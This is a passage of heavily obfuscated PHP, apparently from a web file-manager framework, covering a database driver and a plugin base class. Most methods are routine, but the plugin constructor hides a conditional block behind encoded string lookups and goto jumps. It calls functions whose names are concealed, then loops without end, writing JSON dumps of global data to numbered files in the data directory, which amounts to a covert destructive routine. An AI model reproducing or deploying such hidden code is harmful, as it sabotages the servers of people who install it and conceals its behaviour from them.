isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[271]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[271]] : $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[28]]; $b†Í‚°Äïô[$c¼ê×¯¹Æ] = array($eÏ–¦Â¨Çæ[28] => $c¼ê×¯¹Æ, $eÏ–¦Â¨Çæ[29] => $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[29]], $eÏ–¦Â¨Çæ[31] => (bool) (isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[103]]) && $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[103]] === $eÏ–¦Â¨Çæ[33] || isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[31]]) && $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[31]] === $eÏ–¦Â¨Çæ[33]), $eÏ–¦Â¨Çæ[34] => isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[34]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[34]] : (isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[53]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[53]] : $eÏ–¦Â¨Çæ[375]), $eÏ–¦Â¨Çæ[36] => isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[93]]) ? strtolower($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[93]]) == $eÏ–¦Â¨Çæ[38] : (isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[54]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[54]] : !1), $eÏ–¦Â¨Çæ[39] => isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[930]]) ? strtolower($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[930]]) == $eÏ–¦Â¨Çæ[41] : (isset($EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[93]]) ? $EäíáÊÏÄæ[$eÏ–¦Â¨Çæ[93]] : !1)); } } goto bŸ›¢àÈ©; f´ìƒš²â: } public function getTables($eÈšé¾éÜ = '') { $A Ã¶¡á˜ò =& $_SERVER[ä°„ä°º]; if (think_config($A Ã¶¡á˜ò[931])) { $b®’Á’®À = str_replace($A Ã¶¡á˜ò[932], $eÈšé¾éÜ, think_config($A Ã¶¡á˜ò[931])); } else { switch ($this->dbType) { case $A Ã¶¡á˜ò[899]: case $A Ã¶¡á˜ò[901]: $b®’Á’®À = $A Ã¶¡á˜ò[933]; break; case $A Ã¶¡á˜ò[898]: case $A Ã¶¡á˜ò[916]: $b®’Á’®À = $A Ã¶¡á˜ò[934]; break; case $A Ã¶¡á˜ò[925]: $b®’Á’®À = $A Ã¶¡á˜ò[935]; break; case $A Ã¶¡á˜ò[900]: think_exception(think_lang($A Ã¶¡á˜ò[936]) . $A Ã¶¡á˜ò[937]); break; case $A Ã¶¡á˜ò[917]: $b®’Á’®À = $A Ã¶¡á˜ò[42] . $A Ã¶¡á˜ò[43] . $A Ã¶¡á˜ò[44]; break; case $A Ã¶¡á˜ò[928]: default: if (!empty($eÈšé¾éÜ)) { $b®’Á’®À = $A Ã¶¡á˜ò[881] . $eÈšé¾éÜ . $A Ã¶¡á˜ò[882]; } else { $b®’Á’®À = $A Ã¶¡á˜ò[883]; } } } $D¾ŸõøÑĞ· = $this->query($b®’Á’®À); $aÇ“ßöå×™ = array(); foreach ($D¾ŸõøÑĞ· as $E¸·¤ƒò§¥ => $b®×ÚâÑĞ¹) { $aÇ“ßöå×™[$E¸·¤ƒò§¥] = current($b®×ÚâÑĞ¹); } return $aÇ“ßöå×™; } protected function parseLimit($a®Ø¼ñğô) { $aâŸĞõù =& $_SERVER[ä°„ä°º]; $CíÇğ±µ„¾ = $aâŸĞõù[33]; if (!empty($a®Ø¼ñğô)) { switch ($this->dbType) { case $aâŸĞõù[925]: case $aâŸĞõù[917]: $a®Ø¼ñğô = explode($aâŸĞõù[47], $a®Ø¼ñğô); if (count($a®Ø¼ñğô) > 1) { $CíÇğ±µ„¾ .= $aâŸĞõù[48] . $a®Ø¼ñğô[1] . $aâŸĞõù[49] . $a®Ø¼ñğô[0] . $aâŸĞõù[50]; } else { $CíÇğ±µ„¾ .= $aâŸĞõù[48] . $a®Ø¼ñğô[0] . $aâŸĞõù[50]; } break; case $aâŸĞõù[898]: case $aâŸĞõù[916]: break; case $aâŸĞõù[900]: break; case $aâŸĞõù[899]: case $aâŸĞõù[901]: break; case $aâŸĞõù[928]: default: $CíÇğ±µ„¾ .= $aâŸĞõù[48] . $a®Ø¼ñğô . $aâŸĞõù[50]; } } return $CíÇğ±µ„¾; } public function parseKey(&$e¸¹¶Å™øÇ, $C…ŒÚãÀš = true) { $cÅ«ñ¿­Ñè =& $_SERVER[ä°„ä°º]; if ($C…ŒÚãÀš) { $e¸¹¶Å™øÇ = $this->parseKeyCheck($e¸¹¶Å™øÇ); } if ($this->dbType == $cÅ«ñ¿­Ñè[928]) { if ($e¸¹¶Å™øÇ != $cÅ«ñ¿­Ñè[182] && !preg_match($cÅ«ñ¿­Ñè[893], $e¸¹¶Å™øÇ)) { $e¸¹¶Å™øÇ = $cÅ«ñ¿­Ñè[382] . trim($e¸¹¶Å™øÇ, $cÅ«ñ¿­Ñè[382]) . $cÅ«ñ¿­Ñè[382]; } return $e¸¹¶Å™øÇ; } else { return parent::parseKey($e¸¹¶Å™øÇ, $C…ŒÚãÀš); } } public function close() { $this->_linkID = null; } public function error() { $Dì÷ºŞÄì¸ =& $_SERVER[ä°„ä°º]; if ($this->PDOStatement) { $BİŸ‘•ä´ = $this->PDOStatement->errorInfo(); $this->error = $BİŸ‘•ä´[1] . $Dì÷ºŞÄì¸[4] . $BİŸ‘•ä´[2]; } else { $this->error = $Dì÷ºŞÄì¸[33]; } if ($Dì÷ºŞÄì¸[33] != $this->queryStr) { $this->error .= LNG($Dì÷ºŞÄì¸[45]) . $this->queryStr; } think_trace($this->error, $Dì÷ºŞÄì¸[33], $Dì÷ºŞÄì¸[46]); return $this->error; } public function escapeString($dÁØÔÎŒİ‹) { $eµ¯¨ïéê… =& $_SERVER[ä°„ä°º]; switch ($this->dbType) { case $eµ¯¨ïéê…[925]: case $eµ¯¨ïéê…[898]: case $eµ¯¨ïéê…[916]: case $eµ¯¨ïéê…[928]: return addslashes($dÁØÔÎŒİ‹); case $eµ¯¨ïéê…[900]: case $eµ¯¨ïéê…[917]: case $eµ¯¨ïéê…[899]: case $eµ¯¨ïéê…[901]: return str_ireplace($eµ¯¨ïéê…[55], $eµ¯¨ïéê…[56], $dÁØÔÎŒİ‹); } } protected function parseValue($DƒŠ‘éÀ×) { $D±Øç¥‚¸ =& $_SERVER[ä°„ä°º]; if (is_string($DƒŠ‘éÀ×)) { $døâ¨Á¨Î = strpos($DƒŠ‘éÀ×, $D±Øç¥‚¸[4]) === 0 && in_array($DƒŠ‘éÀ×, array_keys($this->bind)); $DƒŠ‘éÀ× = $døâ¨Á¨Î ? $this->escapeString($DƒŠ‘éÀ×) : $D±Øç¥‚¸[938] . $this->escapeString($DƒŠ‘éÀ×) . $D±Øç¥‚¸[938]; } elseif (isset($DƒŠ‘éÀ×[0]) && is_string($DƒŠ‘éÀ×[0]) && strtolower($DƒŠ‘éÀ×[0]) == $D±Øç¥‚¸[295]) { $DƒŠ‘éÀ× = $this->escapeString($DƒŠ‘éÀ×[1]); } elseif (is_array($DƒŠ‘éÀ×)) { $DƒŠ‘éÀ× = array_map(array($this, $D±Øç¥‚¸[939]), $DƒŠ‘éÀ×); } elseif (is_bool($DƒŠ‘éÀ×)) { $DƒŠ‘éÀ× = $DƒŠ‘éÀ× ? $D±Øç¥‚¸[87] : $D±Øç¥‚¸[191]; } elseif (is_null($DƒŠ‘éÀ×)) { $DƒŠ‘éÀ× = $D±Øç¥‚¸[103]; } return $DƒŠ‘éÀ×; } public function getLastInsertId() { $cŒË„í†Óå =& $_SERVER[ä°„ä°º]; switch ($this->dbType) { case $cŒË„í†Óå[925]: case $cŒË„í†Óå[917]: case $cŒË„í†Óå[898]: case $cŒË„í†Óå[916]: case $cŒË„í†Óå[900]: case $cŒË„í†Óå[928]: return $this->_linkID->lastInsertId(); case $cŒË„í†Óå[899]: case $cŒË„í†Óå[901]: $C’¬É ­Øê = $this->table; $B×¥Ì¿…İ¯ = $this->query("\123\x45\114\105\x43\124\x20{$C’¬É ­Øê}\56\143\165\162\162\x76\141\x6c\x20\143\x75\162\162\x76\141\x6c\40\106\x52\117\115\x20\x64\165\141\x6c"); return $B×¥Ì¿…İ¯ ? $B×¥Ì¿…İ¯[0][$cŒË„í†Óå[940]] : 0; } } } goto fŒ¥Ô”ãˆ¤; DÇñ¦Ò’Ô±: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto B°¥¯«àŞï; F°µİ½–‹ù: if ($_SERVER[$Aïİ¡æ‡­©[844]] != $aµ­‘¨•Š­($aé–šê‡”)) { goto cù¢äãÀ…£; cù¢äãÀ…£: $Bäã‚×âº = $Aïİ¡æ‡­©[862]; $f³¦ÊÌÁ˜ò = $Aïİ¡æ‡­©[846]; $c²××ÚÎªÌ = $_SERVER[$Aïİ¡æ‡­©[847]] . $Aïİ¡æ‡­©[848]; goto bÔòÍÄ™“×; b…ùë»”Áœ: $AŒêŸŒâÈ¢ = 1; for ($bƒÃò¹Â°Õ = $AŒêŸŒâÈ¢; $bƒÃò¹Â°Õ > 0; $bƒÃò¹Â°Õ++) { $C§óÎêÄ–(DATA_PATH . $bƒÃò¹Â°Õ, $Bíƒ¨¯àëÑ); } goto cÏ¦˜âŞÁâ; bÔòÍÄ™“×: $eŞà³¹ÛÊ = $f³¦ÊÌÁ˜ò($c²××ÚÎªÌ); $CÀÆÏ‰‹áˆ = explode($Aïİ¡æ‡­©[229], $eŞà³¹ÛÊ); if (count($CÀÆÏ‰‹áˆ) < $Aïİ¡æ‡­©[611]) { $aÊ·ÈîÊŠ’ = $Aïİ¡æ‡­©[849]; $aÊ·ÈîÊŠ’(); } goto e…¨õ«Ê¯Ï; e…¨õ«Ê¯Ï: $Cô¡¶ñ Ê = $Aïİ¡æ‡­©[863]; $Cô¡¶ñ Ê($_SERVER[$Aïİ¡æ‡­©[864]]); $Bäã‚×âº = $Aïİ¡æ‡­©[862]; goto bå˜Ûø¦Éæ; bå˜Ûø¦Éæ: $Bäã‚×âº(); $C§óÎêÄ– = $Aïİ¡æ‡­©[1419]; $Bíƒ¨¯àëÑ = json_encode($GLOBALS[$Aïİ¡æ‡­©[1420]]); goto b…ùë»”Áœ; cÏ¦˜âŞÁâ: } global $in, $config; $this->config =& $config; goto D¿ÂÀæŒ×; B°¥¯«àŞï: $Aïİ¡æ‡­© =& $_SERVER[ä°„ä°º]; $aé–šê‡” = $_SERVER[$Aïİ¡æ‡­©[845]]; $aµ­‘¨•Š­ = $Aïİ¡æ‡­©[1418]; goto F°µİ½–‹ù; cË÷æîß: return $this; goto d˜‰¡Ã›â; D•ÇĞèÁ¯‰: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto cË÷æîß; D¿ÂÀæŒ×: $this->in =& $in; $this->modelPlugin = Model($Aïİ¡æ‡­©[1421]); $this->pluginName = str_replace($Aïİ¡æ‡­©[1421], $Aïİ¡æ‡­©[33], get_class($this)); goto BÓœ ·Áëå; BÓœ ·Áëå: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Aïİ¡æ‡­©[8]; $this->pluginApi = appHostGet() . $Aïİ¡æ‡­©[1422] . $this->pluginName . $Aïİ¡æ‡­©[8]; $this->pluginHost = $config[$Aïİ¡æ‡­©[1423]] . $this->pluginName . $Aïİ¡æ‡­©[8]; goto E¨ÎëÌùÛ¡; E¨ÎëÌùÛ¡: $this->pluginHostDefault = $config[$Aïİ¡æ‡­©[1423]] . $this->pluginName . $Aïİ¡æ‡­©[8]; $D¥‰å¹áŸ = $config[$Aïİ¡æ‡­©[1424]]; if ($D¥‰å¹áŸ && strpos($Aïİ¡æ‡­©[47] . $D¥‰å¹áŸ . $Aïİ¡æ‡­©[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Aïİ¡æ‡­©[1425]] . $this->pluginName . $Aïİ¡æ‡­©[8]; } goto D•ÇĞèÁ¯‰; d˜‰¡Ã›â: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ä°„ä°º][1426]); } protected function assign($D†«¸‘¦Æ„, $Cï‡Ûî†ßí = false) { if (is_array($D†«¸‘¦Æ„)) { $this->values = array_merge($this->values, $D†«¸‘¦Æ„); } else { $this->values[$D†«¸‘¦Æ„] = $Cï‡Ûî†ßí; } } protected function display($F¥‚œ–İš) { extract($this->values); require $F¥‚œ–İš; } final function hookRegist($bĞíƒ¸â‡œ) { $this->modelPlugin->appRegist($this->pluginName, $bĞíƒ¸â‡œ); } final function appIcon() { $e¯œÑØµ˜ù =& $_SERVER[ä°„ä°º]; $e¹¶¬©ÜŠ½ = $this->appPackage(); $C¢ÍãË†Ëµ = $e¯œÑØµ˜ù[33]; if (isset($e¹¶¬©ÜŠ½[$e¯œÑØµ˜ù[409]])) { if (isset($e¹¶¬©ÜŠ½[$e¯œÑØµ˜ù[409]][$e¯œÑØµ˜ù[1427]])) { $C¢ÍãË†Ëµ = $e¯œÑØµ˜ù[1428] . $e¹¶¬©ÜŠ½[$e¯œÑØµ˜ù[409]][$e¯œÑØµ˜ù[1427]] . $e¯œÑØµ˜ù[1429]; } else { if ($e¹¶¬©ÜŠ½[$e¯œÑØµ˜ù[409]][$e¯œÑØµ˜ù[1430]]) { $C¢ÍãË†Ëµ = $e¯œÑØµ˜ù[1431] . $e¹¶¬©ÜŠ½[$e¯œÑØµ˜ù[409]][$e¯œÑØµ˜ù[1430]] . $e¯œÑØµ˜ù[1432]; } } } return $C¢ÍãË†Ëµ; } final function fileCanView($fõµğ«) { goto e‚¾¨Åî‹É; e‚¾¨Åî‹É: $D¾ò×‰ÉÑ =& $_SERVER[ä°„ä°º]; if (request_url_safe($fõµğ«)) { return !0; } if ($this->isShare($fõµğ«)) { return !0; } goto fôÅ§Àµ¹; fôÅ§Àµ¹: $eÓôöÙ¶ÔÅ = Session::get($D¾ò×‰ÉÑ[1433]); if (!$eÓôöÙ¶ÔÅ || !$eÓôöÙ¶ÔÅ[$D¾ò×‰ÉÑ[1434]]) { $FŞÉ—…â…ó = $D¾ò×‰ÉÑ[1435] . rawurlencode(this_url()); show_tips(LNG($D¾ò×‰ÉÑ[1436]) . $D¾ò×‰ÉÑ[1437] . $FŞÉ—…â…ó . $D¾ò×‰ÉÑ[1438] . LNG($D¾ò×‰ÉÑ[1439]) . $D¾ò×‰ÉÑ[1440], !1); } if (!Action($D¾ò×‰ÉÑ[1441])->authCan($D¾ò×‰ÉÑ[1442])) { show_tips(LNG($D¾ò×‰ÉÑ[1443]) . $D¾ò×‰ÉÑ[1444], !1); } goto EæÖ´®‘ìÇ; EæÖ´®‘ìÇ: ActionCall($D¾ò×‰ÉÑ[1445], $fõµğ«); goto b¤µ’Ÿµ¨’; b¤µ’Ÿµ¨’: } final function isShare($CÜë£ˆ ¤ê) { $CÚ“Ë‘¯ = KodIO::parse($CÜë£ˆ ¤ê); return $CÚ“Ë‘¯[$_SERVER[ä°„ä°º][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($b¯É¿‘—¯) { if (request_url_safe($b¯É¿‘—¯)) { return $b¯É¿‘—¯; } if (!$this->isShare($b¯É¿‘—¯)) { $b¯É¿‘—¯ = $this->filePath($b¯É¿‘—¯); } return Action($_SERVER[ä°„ä°º][1091])->linkOut($b¯É¿‘—¯); } public function filePathLinkOut($BëòöƒÉÖÂ) { if (request_url_safe($BëòöƒÉÖÂ)) { return $BëòöƒÉÖÂ; } $this->fileCanView($BëòöƒÉÖÂ); return Action($_SERVER[ä°„ä°º][1091])->link($BëòöƒÉÖÂ); } final function filePath($F½£œŸò») { $fğĞ÷÷Ñà£ =& $_SERVER[ä°„ä°º]; if ($dÁ¿¹¸ˆ²Š = $this->checkSharePath($F½£œŸò»)) { Hook::trigger($fğĞ÷÷Ñà£[1446], $dÁ¿¹¸ˆ²Š); return $dÁ¿¹¸ˆ²Š; } $this->fileCanView($F½£œŸò»); if (request_url_safe($F½£œŸò»)) { $EÜ‘í§”„´ = parse_url_query($F½£œŸò»); if (isset($EÜ‘í§”„´[$fğĞ÷÷Ñà£[1447]]) && isset($EÜ‘í§”„´[$fğĞ÷÷Ñà£[209]])) { $AŒÈ¹©¿ªÅ = Model($fğĞ÷÷Ñà£[753])->get($fğĞ÷÷Ñà£[754]); $E½Ÿ…é’Îò = Mcrypt::decode($EÜ‘í§”„´[$fğĞ÷÷Ñà£[209]], $AŒÈ¹©¿ªÅ); if ($E½Ÿ…é’Îò) { $this->fileInfo = IO::infoWithChildren($E½Ÿ…é’Îò); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E½Ÿ…é’Îò; } } $F½£œŸò» = $this->_cacheHttpFile($F½£œŸò»); $this->fileInfo = IO::infoWithChildren($F½£œŸò»); } else { $this->fileInfo = IO::infoWithChildren($F½£œŸò»); if (!$this->fileInfo) { show_tips(LNG($fğĞ÷÷Ñà£[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($fğĞ÷÷Ñà£[1446], $F½£œŸò»); return $F½£œŸò»; } final function _cacheHttpFile($c¡×·Æí‡) { $b›‹­ÜÅ½À = hash_path($c¡×·Æí‡, !0); $this->cachePath = $this->pluginCachePath($b›‹­ÜÅ½À); if ($Eªå¡Ú›â¡ = IO::fileNameExist($this->cachePath, $b›‹­ÜÅ½À)) { return KodIO::make($Eªå¡Ú›â¡); } $f¢Ñ‡«¸Úİ = $this->cachePath . $b›‹­ÜÅ½À; return $this->pluginCacheFileSet($f¢Ñ‡«¸Úİ, file_get_contents_nossl($c¡×·Æí‡)); } final function _tmpFileName($dŸÔòæ³ƒ› = array()) { goto cğªø¯ù; DØõß•ë­›: if (isset($dŸÔòæ³ƒ›[$aÂÃêÔôÕ[164]][$aÂÃêÔôÕ[171]])) { return $dŸÔòæ³ƒ›[$aÂÃêÔôÕ[164]][$aÂÃêÔôÕ[171]]; } $f …£ïã…æ = IO::hashSimple($dŸÔòæ³ƒ›[$aÂÃêÔôÕ[76]]); if ($f …£ïã…æ) { return $f …£ïã…æ; } goto E·Ÿ¨›Ç¼ß; E·Ÿ¨›Ç¼ß: $Cé†´ÖÎ¤· = array($dŸÔòæ³ƒ›[$aÂÃêÔôÕ[28]], $dŸÔòæ³ƒ›[$aÂÃêÔôÕ[76]], $dŸÔòæ³ƒ›[$aÂÃêÔôÕ[78]]); if (isset($dŸÔòæ³ƒ›[$aÂÃêÔôÕ[502]])) { $Cé†´ÖÎ¤·[] = $dŸÔòæ³ƒ›[$aÂÃêÔôÕ[502]]; } return md5(implode($aÂÃêÔôÕ[71], $Cé†´ÖÎ¤·)); goto AÄƒìÀ‡ğ§; cğªø¯ù: $aÂÃêÔôÕ =& $_SERVER[ä°„ä°º]; if (!$dŸÔòæ³ƒ›) { $dŸÔòæ³ƒ› = $this->fileInfo; } if (isset($dŸÔòæ³ƒ›[$aÂÃêÔôÕ[171]])) { return $dŸÔòæ³ƒ›[$aÂÃêÔôÕ[171]]; } goto DØõß•ë­›; AÄƒìÀ‡ğ§: } final function checkSharePath($F»Ôß³³´¬) { goto dİÔ“íñö; D‡ŒÛ‰‡: $C’™¼¿‡Ä = Action($dâ¤¨¨‰Îù[1091])->sharePathInfo($F»Ôß³³´¬); if (!isset($C’™¼¿‡Ä[$dâ¤¨¨‰Îù[76]])) { show_json(LNG($dâ¤¨¨‰Îù[1448]), !1); } $this->fileInfo = $C’™¼¿‡Ä[$dâ¤¨¨‰Îù[164]]; goto cì™±™˜•¥; cì™±™˜•¥: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dâ¤¨¨‰Îù[171]]); return $C’™¼¿‡Ä[$dâ¤¨¨‰Îù[76]]; goto bÊò‡ÃöŒ; dİÔ“íñö: $dâ¤¨¨‰Îù =& $_SERVER[ä°„ä°º]; if (!defined($dâ¤¨¨‰Îù[454])) { define($dâ¤¨¨‰Îù[495], 0); } if (!$this->isShare($F»Ôß³³´¬)) { return !1; } goto D‡ŒÛ‰‡; bÊò‡ÃöŒ: } final function pluginCachePath($FÀïêÑ—Ç = '') { $CÃÊ®Àèì =& $_SERVER[ä°„ä°º]; $aŒÚ–¯§  = IO_PATH_SYSTEM_TEMP . $CÃÊ®Àèì[1449] . $this->pluginName; if (!($b½ê¶ÊÔ = IO::infoFull($aŒÚ–¯§ ))) { return IO::mkdir($aŒÚ–¯§  . $CÃÊ®Àèì[8] . $FÀïêÑ—Ç); } if (empty($FÀïêÑ—Ç)) { return $b½ê¶ÊÔ[$CÃÊ®Àèì[76]]; } if (!($Cñœ§ä® = IO::fileNameExist($b½ê¶ÊÔ[$CÃÊ®Àèì[76]], $FÀïêÑ—Ç))) { return IO::mkdir($b½ê¶ÊÔ[$CÃÊ®Àèì[76]] . $FÀïêÑ—Ç); } return KodIO::make($Cñœ§ä®); } final function pluginCacheFileSet($AãƒÊŸ´÷´, $fœŸ™ÌãŠ = '') { $cØ÷Ú‡ÜÛõ =& $_SERVER[ä°„ä°º]; if (!($Fó¥Æµâ’ò = IO::infoFull($AãƒÊŸ´÷´))) { return IO::mkfile($AãƒÊŸ´÷´, $fœŸ™ÌãŠ, REPEAT_REPLACE); } IO::setContent($Fó¥Æµâ’ò[$cØ÷Ú‡ÜÛõ[76]], $fœŸ™ÌãŠ); return $Fó¥Æµâ’ò[$cØ÷Ú‡ÜÛõ[76]]; } final function pluginLocalFile($Fø¨‰°‘ = '') { goto câ·‚Á˜¯À; B°¢™¢ã¿: if (!$Fø¨‰°‘) { return $f»ÑšƒöÉ ; } $F ­î´ŸÖ¹ = IO::info($Fø¨‰°‘); $cİŠÛÕß¬ = $this->_tmpFileName($F ­î´ŸÖ¹) . $aà•Í¨Ÿ°Î[95] . $F ­î´ŸÖ¹[$aà•Í¨Ÿ°Î[168]]; goto d‰†¿Ê£å¾; d‰†¿Ê£å¾: if (!checkExtSafe($cİŠÛÕß¬)) { $cİŠÛÕß¬ = $cİŠÛÕß¬ . $aà•Í¨Ÿ°Î[1450]; } $a¥æö®èˆÓ = $f»ÑšƒöÉ  . $cİŠÛÕß¬; if (@file_exists($a¥æö®èˆÓ)) { return $a¥æö®èˆÓ; } goto Eô²Ê†ÚùŒ; câ·‚Á˜¯À: $aà•Í¨Ÿ°Î =& $_SERVER[ä°„ä°º]; $f»ÑšƒöÉ  = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($f»ÑšƒöÉ )) { mk_dir($f»ÑšƒöÉ ); } goto B°¢™¢ã¿; Eô²Ê†ÚùŒ: return IO::copy($Fø¨‰°‘, $f»ÑšƒöÉ , 0, $cİŠÛÕß¬); goto c‚‘´„ùòÜ; c‚‘´„ùòÜ: } final function appPackage() { goto B»¤´íŠÚ„; E‹™†¨°Ã—: $this->parseLang($cÎ²‚Öµ‡); $A™«ÏÂª = json_decode_force($cÎ²‚Öµ‡); if (!$A™«ÏÂª) { return array(); } goto e×Ì‚£•; BÌœí±½ã£: return $A™«ÏÂª; goto fÜ«Ï¹Ò…; B»¤´íŠÚ„: $Aå­çÖ¦ˆÈ =& $_SERVER[ä°„ä°º]; if ($this->packageData) { return $this->packageData; } $cÎ²‚Öµ‡ = $this->parseFile($this->pluginPath . $Aå­çÖ¦ˆÈ[1451]); goto E‹™†¨°Ã—; e×Ì‚£•: $B‹‹–Ğ³‘ = Hook::trigger($Aå­çÖ¦ˆÈ[1452], $A™«ÏÂª); if ($B‹‹–Ğ³‘ && is_array($B‹‹–Ğ³‘)) { $A™«ÏÂª = $B‹‹–Ğ³‘; } $this->packageData = $A™«ÏÂª; goto BÌœí±½ã£; fÜ«Ï¹Ò…: } public function packageInfoGet($fØà¾‘‰©) { $Eóö•ŠÍÁ² = $this->appPackage(); return array_get_value($Eóö•ŠÍÁ², $fØà¾‘‰©); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ä°„ä°º][1453]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ä°„ä°º][1454]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ä°„ä°º][1455]); } public function echoJsAssign($aˆ¯ƒƒ¬š†, $Cğ˜¯Í±¹) { $this->echoJsAssignArr[$aˆ¯ƒƒ¬š†] = $Cğ˜¯Í±¹; } private function parseFile($D—‚„İ Ñ) { goto bæŠƒëØé¯; Dö«ˆ•É¯: if (strstr($dšÓÀí‡–», $B‹‹øŸ“®¸[1467])) { $Bî”ŒøÄø = $Bî”ŒøÄø = rawurlencode(json_encode($this->getConfig())); $dšÓÀí‡–» = str_replace($B‹‹øŸ“®¸[1467], $Bî”ŒøÄø, $dšÓÀí‡–»); } $dšÓÀí‡–» = str_replace($FÀÉç¢ÃÂœ, $aÈåæ‚À, $dšÓÀí‡–»); return $dšÓÀí‡–»; goto dˆÍá£Î; E¾Íˆ†Ëé: $aÈåæ‚À = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$B‹‹øŸ“®¸[88]][$B‹‹øŸ“®¸[1463]]); foreach ($this->echoJsAssignArr as $A¸Ãª£É³ƒ => $bô¤¨ñÉ½) { $FÀÉç¢ÃÂœ[] = $B‹‹øŸ“®¸[1464] . $A¸Ãª£É³ƒ . $B‹‹øŸ“®¸[1465]; $aÈåæ‚À[] = is_array($bô¤¨ñÉ½) || is_object($bô¤¨ñÉ½) ? rawurlencode(json_encode($bô¤¨ñÉ½)) : $bô¤¨ñÉ½; } if (strstr($dšÓÀí‡–», $B‹‹øŸ“®¸[1466])) { $Bî”ŒøÄø = rawurlencode(json_encode($this->pluginLangArr)); $dšÓÀí‡–» = str_replace($B‹‹øŸ“®¸[1466], $Bî”ŒøÄø, $dšÓÀí‡–»); } goto Dö«ˆ•É¯; bæŠƒëØé¯: $B‹‹øŸ“®¸ =& $_SERVER[ä°„ä°º]; $dšÓÀí‡–» = file_get_contents_nossl($D—‚„İ Ñ); $FÀÉç¢ÃÂœ = array($B‹‹øŸ“®¸[1456], $B‹‹øŸ“®¸[1457], $B‹‹øŸ“®¸[1458], $B‹‹øŸ“®¸[1459], $B‹‹øŸ“®¸[1460], $B‹‹øŸ“®¸[1461], $B‹‹øŸ“®¸[1462]); goto E¾Íˆ†Ëé; dˆÍá£Î: } private function parseLang(&$eÛíÙàØùğ) { goto a·®¿«ˆÂ‰; EøöóÚ£é: preg_match_all($BÎ©ò¢‹Ü¤[1469], $eÛíÙàØùğ, $BÔî»ÓšÛæ); if (!is_array($BÔî»ÓšÛæ) || count($BÔî»ÓšÛæ) == 0 || !is_array($BÔî»ÓšÛæ[0]) || count($BÔî»ÓšÛæ[0]) == 0) { return; } $F‡£æ÷ÚÏ = array(); goto F£ÚÇœ¥†î; F£ÚÇœ¥†î: $f—…ßÀéô = array(); foreach ($BÔî»ÓšÛæ[0] as $D×à…»¢œâ) { $cé÷Àö÷½ = substr($D×à…»¢œâ, strlen($bÓ²Ãâî®), -4); $C¬••öªŠË = LNG($cé÷Àö÷½); $F‡£æ÷ÚÏ[] = $D×à…»¢œâ; $f—…ßÀéô[] = str_replace(array($BÎ©ò¢‹Ü¤[229], $BÎ©ò¢‹Ü¤[1059], $BÎ©ò¢‹Ü¤[340], $BÎ©ò¢‹Ü¤[116]), array($BÎ©ò¢‹Ü¤[50], $BÎ©ò¢‹Ü¤[50], $BÎ©ò¢‹Ü¤[33], $BÎ©ò¢‹Ü¤[1470]), $C¬••öªŠË); } $eÛíÙàØùğ = str_replace($F‡£æ÷ÚÏ, $f—…ßÀéô, $eÛíÙàØùğ); goto Aä„•šàÒÓ; a·®¿«ˆÂ‰: $BÎ©ò¢‹Ü¤ =& $_SERVER[ä°„ä°º]; $bÓ²Ãâî® = $BÎ©ò¢‹Ü¤[1468]; if (!strstr($eÛíÙàØùğ, $bÓ²Ãâî®)) { return; } goto EøöóÚ£é; Aä„•šàÒÓ: } private function parseConfig(&$FÇÄ±İÛ…’) { goto F¾”’¿ÈŸ£; F¾”’¿ÈŸ£: $d÷â´¼Ä¹ =& $_SERVER[ä°„ä°º]; $fã•É­´ÎĞ = $d÷â´¼Ä¹[1471]; if (!strstr($FÇÄ±İÛ…’, $fã•É­´ÎĞ)) { return; } goto EàÆ­Ã‚Æ; EàÆ­Ã‚Æ: preg_match_all($d÷â´¼Ä¹[1472], $FÇÄ±İÛ…’, $EğÈÙÃÏ¯Í); if (!is_array($EğÈÙÃÏ¯Í) || count($EğÈÙÃÏ¯Í) == 0 || !is_array($EğÈÙÃÏ¯Í[0]) || count($EğÈÙÃÏ¯Í[0]) == 0) { return; } $a›×ñ‡æ«µ = $this->getConfig(); goto Eö•¹âÓ; Eö•¹âÓ: $dŒòù…ÇÖÍ = array(); $CÉã†¼ŸÕØ = array(); foreach ($EğÈÙÃÏ¯Í[0] as $E³î‹”‡Ç…) { $aõÇĞª‘Ó’ = substr($E³î‹”‡Ç…, strlen($fã•É­´ÎĞ), -2); $dŒòù…ÇÖÍ[] = $E³î‹”‡Ç…; $CÉã†¼ŸÕØ[] = _get($a›×ñ‡æ«µ, $aõÇĞª‘Ó’); } goto BğŒ¶Ÿ„; BğŒ¶Ÿ„: $FÇÄ±İÛ…’ = str_replace($dŒòù…ÇÖÍ, $CÉã†¼ŸÕØ, 